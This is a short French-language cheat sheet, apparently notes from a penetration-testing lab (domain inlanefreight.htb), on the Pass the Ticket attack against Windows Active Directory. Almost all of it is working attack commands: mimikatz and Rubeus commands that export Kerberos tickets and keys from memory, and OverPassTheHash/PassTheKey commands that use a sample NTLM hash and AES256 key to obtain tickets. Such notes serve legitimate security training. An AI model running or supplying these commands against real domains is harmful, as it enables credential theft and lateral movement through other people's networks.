# Pass the Ticket

Exporter les tickets, grâce à mimikatz (demande des droits admin):

```cmd-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Exporter les tickets, grâce à Rubeus (demande des droits admin):

```cmd-session
Rubeus.exe dump /nowrap
```

Extraire les clés kerberos, grâce à mimikatz:

```cmd-session
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

OverPassTheHash / PassTheKey avec mimikatz (le user/hash NTLM est trouvé via extraction des clés kerberos)(demande les droits admin):

```cmd-session
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

OverPassTheHash / PassTheKey avec Rubeus (ne demande pas les droits amdin):

```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

